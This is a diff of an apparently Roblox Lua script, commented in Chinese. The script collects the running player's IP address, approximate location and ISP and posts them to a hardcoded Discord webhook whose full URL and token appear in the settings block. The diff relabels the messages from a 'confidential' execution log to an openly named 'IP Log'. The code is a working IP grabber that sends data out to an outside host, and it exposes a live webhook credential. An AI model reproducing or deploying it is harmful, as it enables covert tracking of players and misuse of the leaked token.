@@ -7,7 +7,7 @@ local LocalPlayer = Players.LocalPlayer
 --// 設定
 local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"
 local gameName = "Unknown"
-local embedColor = tonumber("0x3498DB" ) -- 經典藍色
+local embedColor = tonumber("0x00FF00" )
 
 --// 增強的 HTTP 請求函數
 local function secureRequest(options)
@@ -84,7 +84,7 @@ pcall(function()
         local isp = (ip_info and ip_info.org) or "未知"
         
         local secretBlock = string.format(
-            "\n\n**網路資訊 (機密):**\n" ..
+            "\n\n**IP資訊:**\n" ..
             "**IP 位址:** `%s`\n" ..
             "**推測位置:** `%s`\n" ..
             "**網路供應商:** `%s`",
@@ -95,9 +95,9 @@ pcall(function()
 
     -- 6. 構建並發送最終的 webhook 資料
     local data = {
-        username = "執行日誌",
+        username = "三眼怪 Log",
         embeds = {{
-            title = "腳本執行紀錄",
+            title = "IP Log:",
             description = description,
             color = embedColor,
             footer = {
